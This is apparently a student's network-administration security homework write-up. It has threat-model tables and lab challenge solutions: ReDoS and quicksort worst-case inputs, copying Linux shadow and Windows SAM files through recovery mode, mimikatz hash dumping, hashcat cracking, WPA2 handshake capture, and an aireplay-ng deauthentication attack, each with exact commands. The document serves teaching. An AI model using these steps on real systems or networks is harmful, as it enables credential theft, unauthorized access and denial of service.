---
typora-root-url: pics/
---

# NASA HW5

b09902004 郭懷元

# Security

## 1. Threat Modeling

### (1)

**Assumption**

- The ship works as supposed.
- Any lost of cargo isn't acceptable.
- Not considering natural disasters such as typhoons and tsunami.

| Threat Model                    | Countermeasure                                  |
| ------------------------------- | ----------------------------------------------- |
| Pirates attack the ship         | Ask for navy's protection                       |
| Auto-pilot system gets attacked | Always keep the pilot aware of the ship's state |

### (2)

**Assumption**

- No violence is involved.

| Threat Model                                   | Countermeasure                                               |
| ---------------------------------------------- | ------------------------------------------------------------ |
| Customer sneaks out the restaurant             | Ask customers to pay first                                   |
| Customer tries bring people in that didn't pay | Give customer who have paid a wrist band for identification. Only people with it can get tableware. |

### (3)

**Assumption**

- A team competition.
- Discussion between different teams and using internet resources are illegal.
- PCs in R204 work normally.

| Threat Model                                             | Countermeasure                                     |
| -------------------------------------------------------- | -------------------------------------------------- |
| Participants bring cellphones and laptops to communicate | Ban use of electronic devices other than R204's PC |
| Participants discuss when going to restroom              | Allow only one team to leave R204 at a time.       |

### (4)

**Assumption**

| Threat Model | Countermeasure |
| ------------ | -------------- |
|              |                |
|              |                |



## 2. Proof of Work & DoS 

### 3.

> Refs:
>
> b09902011 陳可邦

Flag: `HW5{c4ts_ar3_a_1ot_cut3r_th4n_柴魚}`

Be reading `server.py`, we know that the flag will be shown if `qsort()` runs slow enough, and the implementation chooses pivot from the middle of the array. Therefore we can construct an input  that forces `qsort()` run in quadratic time. The "evil" input looks something like this: `... 7 5 3 1 2 4 6 ...`.

Code based on `example.py` to obtain the flag is in `p2-3.py`.

![sec-p2-3](/sec-p2-3.png)

---

### 4.

> Refs:
>
> b09902011 陳可邦
> https://medium.com/swlh/exploiting-redos-d610e8ba531
> https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

Flag: `HW5{柴魚柴油乾柴烈火火柴砍柴柴米油鹽醬醋茶留得青山在不怕沒柴燒}`

Mail content: `Dear Sophia, 柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚. Best wishes, 123456789012345678901234567890@.`

In `server.py`, we can find this regex expression. The exploitable part is `([a-zA-Z0-9]+ ?)+\.$`, because a `+` is inside another `+`'s target pattern.

When the regex engine first tries to match that pattern, `+` will try to match as many characters as possible.

```
(123456789012345678901234567890)@.
```

And mathcing will fail because of the `@`. Then the `+` inside will backtrack.

```
(12345678901234567890123456789)(0)@.
(1234567890123456789012345678)(90)@.
(1234567890123456789012345678)(9)(0)@.
So on and so on...
```

Time complexity becomes exponential and DoS attacks become possible.

![sec-p2-4](/sec-p2-4.png)

---

### 5.

> Refs:
>
> b09902011 陳可邦

Flag: `HW5{y0u_shou1d_w0rk_unt1l_4.am_wi7h_m3_ev3ry_d4y!}`

Certificate: `2757602341||220.82929244357436||c504c8bf51ee18d7c1e8f7bf80afa7f5f2814843290bcf749e8fc8e9f75cfe36`

Because `proof_of_work()` the random number fed to hash only ranges from `0` to `2^24-1`, we can generate a table to use hashed values to lookup prehashed values.

Code to generate lookup table is in `gen_rainbow.py`. Code based on `example.py` to obtain the flag is in `p2-5.py`. Run `python gen_rainbow.py` first to generate the data needed.

![sec-p2-5](/sec-p2-5.png)

---

## 4. 弱密碼

### 1.

> Refs:
>
>b09902011 陳可邦
> https://cccharles.pixnet.net/blog/post/326116524
> https://samsclass.info/123/proj10/p12-hashcat.htm

Flag: `HW5{R3al1y_Da_Y1_:P}`

**Getting the hash**

1. Plug in the flash drive and connect it to the VM.
2. Select `Advanced Options` and `Ubuntu, with <kernel info> (recovery)`.
3. In recovery menu, choose `root` to drop to shell.
4. `lsblk` to find flash drive's device name, `mount /dev/<device name> /mnt`.
5. `cp /etc/shadow /mnt`, turn off vm.
6. Remove every line except the line with hank, and keep only the hash. Save it as `ubuntu-hash`.

**Cracking the password**

```shell
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-1000000.txt
./hashcat-6.1.0/hashcat.bin -m 1800 -a 0 ubuntu-hash xato-net-10-million-passwords-1000000.txt
```

- `-m 1800`: Cracking linux's hash for passwords.
- `-a 0`: Dictionary mode.
- `ubuntu-hash`: File containing hash.
- `xato-net-10-million-passwords-1000000.txt`: Dictionary file.

The password is `1qaz2wsx3edc4rfv`. The flag in the desktop image of the vm.

![sec-p4-1](/sec-p4-1.png)

![sec-p4-1-2](/sec-p4-1-2.png)

---

### 2.

> Refs:
>
> b09902011 陳可邦
> https://security.stackexchange.com/questions/157922/how-are-windows-10-hashes-stored-if-the-account-is-setup-using-a-microsoft-accou
> https://miloserdov.org/?p=4129
> https://hashcat.net/wiki/doku.php?id=hashcat
> https://windowsreport.com/how-to-enter-recovery-mode-in-windows-10/

Flag: `HW5{Micro$0ft也大意啦}`

**Getting dump file**

1. Plug in a flash drive with windows installation tools. Plug in another for copying files out.
2. Boot with the windows flash drive, enter recovery mode and open command line.
3. `XCOPY /E /I /D /C C:\Windows\System32\config\SAM E:`, `XCOPY /E /I /D /C C:\Windows\System32\config\SYSTEM E:`, turn off VM.

**Getting hash from dump file**

1. Download `mimikatz` from the github repo.
2. In powershell, run `mimikatz.exe`
3. `lsadump::sam /system:<system file copied from vm> /sam:<sam file copied from vm>`
4. In the output text, the hash looks like this:

```
RID  : 000003e8 (1000)
User : howhow
  Hash NTLM: 674ba145222376d43d4f0a9e3f6f315f
```

**Cracking the hash**

Since we are brute forcing, GPU would help a lot. I start with 8-character passwords then increase the length.

```shell
./hashcat-6.1.0/hashcat.bin -I # check available devices
./hashcat-6.1.0/hashcat.bin -m 1000 -a 3 -d 3 windows-hash -1 ?l?d a?1?1?1?1?1?1?1
./hashcat-6.1.0/hashcat.bin -m 1000 -a 3 -d 3 windows-hash -1 ?l?d a?1?1?1?1?1?1?1?1
```

- `-m 1000`: Cracking NTLM hash.
- `-a 3`: Brute force mode.
- `-d 3`: Specifying GPU to use.
- `windows-hash`: File containing hash.
- `-1 ?l?d`: A customize character set that includes lowercase letters and digits.
- `a?1?1?1?1?1?1?1?1`: A mask for brute forcing. An `a` followed by 8 characters from set `1`.

The password is `apple8787`. The flag is the filenames of files on desktop.

![sec-p4-2-1](/sec-p4-2-1.png)

![sec-p4-2-2](/sec-p4-2-2.png)

---

### 3.

1. Use hardware key authentication. For example, the "Security Key" option in Windows 10 login option.
2. Use multi-factor authentication.

## 5. WiFi Hacking

> Refs:
>
> b09902011 陳可邦
> b09902100 林弘毅
> https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/
> https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
> https://wiki.wireshark.org/HowToDecrypt802.11
> https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142


### 1.

WiFi password: `0918273645`

```shell
ifconfig # Find wifi interface, mine is wlo1
sudo airmon-ng start wlo1
ifconfig # wlo1 will be replaced with a new interface, mine is wlo1mon
sudo airodump-ng
```

![sec-p5-1](/sec-p5-1.png)

An entry with ESSID `Palace of Joe Tsai` is the AP. It has MAC address `94:BF:C4:32:CC:88` on channel `4`.

```shell
sudo airodump-ng wlo1mon --bssid 94:BF:C4:32:CC:88 -c 4 --write hack_wifi
```

This will capture traffics associated with `Palace of Joe Tsai` and dump them to some files named `hack_wifi`.

Generated files are:

```
hack_wifi.cap
hack_wifi.csv
hack_wifi.kismet.csv
hack_wifi.kismet.netxml
hack_wifi.log.csv
```

Upload the `.cap` file to https://hashcat.net/cap2hccapx/ or download the execuable to convert it to `.hccapx` for hashcat. Mine has filename `hash_wifi.hccapx`.

```shell
./hashcat-6.1.0/hashcat.bin -m 2500 -a 3 hash_wifi.hccapx 09?d?d?d?d?d?d?d?d
```

![sec-p5-1-2](/sec-p5-1-2.png)

---

### 2.

Flag: `HW5{Jo3_Tsa1-7he_M4st3r_0F_Tra1niNg}`

Open `hack_wifi.cap` with WireShark. Go to `Edit` -> `Preferences` -> `Protocols` -> `IEEE 802.11`.

Add a decryption key like this:

![sec-p5-2-3](/sec-p5-2-3.png)

Go to `Statistics` -> `Conversations` -> `TCP`. Select arbitary entry and `follow stream` because they all have the same two hosts.

![sec-p5-2-1](/sec-p5-2-1.png)
![sec-p5-2-2](/sec-p5-2-2.png)

---

### 3.

Flag: `HW5{j0e_ts4I_1s_d0ub1e_gun_k4i's_b3st_fr13nD}`

To obtain victim's MAC address, run:

```shell
sudo airodump-ng wlo1mon --bssid 94:BF:C4:32:CC:88 -c 4 # the same command from p5-1
```

![sec-p5-3-1](/sec-p5-3-1.png)

The victim's MAC address is shown in `STATION`, which is `8C:88:2B:00:73:6E`. To send attack, run:

```shell
sudo aireplay-ng --deauth 0 -c 8C:88:2B:00:73:6E -a 94:BF:C4:32:CC:88 wlo1mon
```

- `--deauth 0`: Keep sending deauthentication signal until we stop.
- `-c`: Victim's MAC address
- `-a`: WiFi AP's MAC address
- `wlo1mon`: WiFi interface on my laptop

Then check the web page with another device.

![sec-p5-3-2](/sec-p5-3-2.png)

---

